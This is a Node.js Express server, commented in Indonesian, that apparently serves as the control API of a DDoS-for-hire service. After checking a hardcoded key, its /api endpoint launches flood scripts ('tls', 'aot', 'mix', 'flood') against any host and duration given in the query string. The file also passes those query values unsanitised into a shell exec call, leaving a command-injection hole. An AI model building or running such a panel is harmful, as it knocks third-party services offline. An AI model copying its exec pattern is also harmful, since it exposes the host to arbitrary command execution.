const express = require('express');
const { exec } = require('child_process');
const path = require('path');
const app = express();
const port = 4000;

// Daftar metode dan skrip terkait
const scripts = {
    tls: 'TLS-SUS.js',
    aot: 'TLSV2.js',  // Menambahkan metode 'aot' dengan skrip 'AOT.js'
    mix: 'MIXMAX.js',
    flood: 'flood.js'
};

app.get('/api', (req, res) => {
    const key = req.query.key;
    const host = req.query.host;
    const portNumber = req.query.port;
    const time = req.query.time;
    const method = req.query.method;

    // Validasi dan logika pemrosesan
    if (key !== 'xzzy4u') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    if (scripts[method]) {
        const scriptPath = path.join(__dirname, scripts[method]);
        console.log(`Running script with path: ${scriptPath}`);
        console.log(`Host: ${host}, Time: ${time}, Port: ${portNumber}`);

        // Menjalankan skrip dengan argumen host, time, dan tambahan parameter
        exec(`node ${scriptPath} ${host} ${time} 10 10`, (error, stdout, stderr) => {
            // Mengabaikan kesalahan dan stderr
            res.json({
                key: key,
                host: host,
                port: portNumber,
                time: time,
                method: method,
                result: stdout
            });
        });
    } else {
        res.status(400).json({
            key: key,
            host: host,
            port: portNumber,
            time: time,
            method: method,
            result: 'Unknown method'
        });
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});